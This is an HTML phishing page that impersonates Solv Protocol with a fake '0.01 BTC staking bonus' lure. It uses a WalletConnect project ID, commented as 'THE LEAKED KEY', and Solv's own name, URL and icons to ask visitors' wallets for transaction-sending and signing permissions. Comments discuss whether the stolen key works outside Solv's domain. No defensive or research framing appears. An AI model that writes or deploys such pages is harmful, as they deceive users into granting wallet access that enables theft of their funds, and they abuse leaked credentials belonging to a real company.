<!DOCTYPE html>
<html>
<head>
    <title>Solv Protocol - BTC Rewards</title>
    <script src="https://unpkg.com/@walletconnect/sign-client@2.10.6/dist/index.umd.js"></script>
    <script src="https://unpkg.com/@walletconnect/qrcode-modal@1.8.0/dist/index.min.js"></script>
</head>
<body>
    <h1>Solv Protocol - BTC Rewards Portal</h1>
    <p>Connect your wallet to claim your 0.01 BTC staking bonus.</p>
    <button id="btn" style="padding: 15px; background: blue; color: white; border: none; border-radius: 5px; cursor: pointer;">
        Connect Wallet
    </button>

    <script>
        // THE LEAKED KEY
        const projectId = '_gg7wSSi0KMBsdKnGVfHDueq6xMB9EkC';

        document.getElementById('btn').addEventListener('click', async () => {
            try {
                // SignClient.init is the correct way to start v2
                const signClient = await SignClient.init({
                    projectId: projectId,
                    metadata: {
                        name: 'Solv Protocol',
                        description: 'Solv Finance App',
                        url: 'https://app.solv.finance',
                        icons: ['https://solv.finance/favicon.ico']
                    }
                });

                // Create a proposal for connection
                const { uri, approval } = await signClient.connect({
                    requiredNamespaces: {
                        eip155: {
                            methods: ['eth_sendTransaction', 'personal_sign'],
                            chains: ['eip155:1'],
                            events: ['chainChanged', 'accountsChanged']
                        }
                    }
                });

                if (uri) {
                    // Use the correct global for the QR Code Modal
                    WalletConnectQRCodeModal.open(uri, () => {
                        console.log("Modal closed");
                    });
                }

                // Await session approval
                const session = await approval();
                console.log("Connected!", session);

            } catch (err) {
                console.error("Connection Error:", err);
                // If it's a 403, the Project ID is restricted to their domain
                if (err.message.includes('403')) {
                    alert("Key is restricted to Solv's official domain.");
                } else {
                    alert("Error: " + err.message);
                }
            }
        });
    </script>
</body>
</html>
